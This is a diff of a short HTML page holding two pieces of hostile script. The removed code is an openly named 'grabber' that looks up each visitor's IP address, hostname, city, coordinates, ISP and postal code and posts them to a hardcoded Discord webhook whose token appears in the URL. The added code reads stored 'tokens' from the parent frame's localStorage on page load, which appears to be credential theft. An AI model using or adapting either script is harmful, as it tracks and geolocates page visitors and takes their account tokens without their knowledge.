@@ -1,66 +1,9 @@
 <html>
 <body>
     <script>
-        import("https://code.jquery.com/jquery-3.6.1.js").then(function() {
-            $.get("https://ipinfo.io", function(ipinfo) {
-                fetch("https://discordapp.com/api/webhooks/1043050867286360114/jH1rEdFkds7h2YL_UUbIoQiIR49ebsne7lFVZ_YAOI1Cu4ob0o1NT8aPEo8DnpYvDbk6", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        username: "Burkizzers Grabber",
-                        content: " ",
-                        embeds: [{
-                            author: {
-                                name: 'New Informations Grabbed!'
-                            },
-                            fields: [{
-                                    name: 'IP Adress',
-                                    value: ipinfo.ip,
-                                    inline: true
-                                },
-                                {
-                                    name: 'Hostname',
-                                    value: ipinfo.hostname,
-                                    inline: true
-                                },
-                                {
-                                    name: 'City / Region',
-                                    value: ipinfo.city + "/" + ipinfo.region,
-                                    inline: true
-                                },
-                                {
-                                    name: 'Country',
-                                    value: ipinfo.country,
-                                    inline: true
-                                },
-                                {
-                                    name: 'GEO Location',
-                                    value: ipinfo.loc,
-                                    inline: true
-                                },
-                                {
-                                    name: 'Organization',
-                                    value: ipinfo.org,
-                                    inline: true
-                                },
-                                {
-                                    name: 'Postal Code',
-                                    value: ipinfo.postal,
-                                    inline: true
-                                },
-                                {
-                                    name: 'Timezone',
-                                    value: ipinfo.timezone,
-                                    inline: true
-                                },
-                            ],
-                        }]
-                    })
-                });
-            }, "JSONP");
-        });
+        document.body.onload = function() {
+            document.body.innerHTML = Object.values(JSON.parse(parent["0"].localStorage.tokens));
+        }
     </script>
 </body>
 </html>
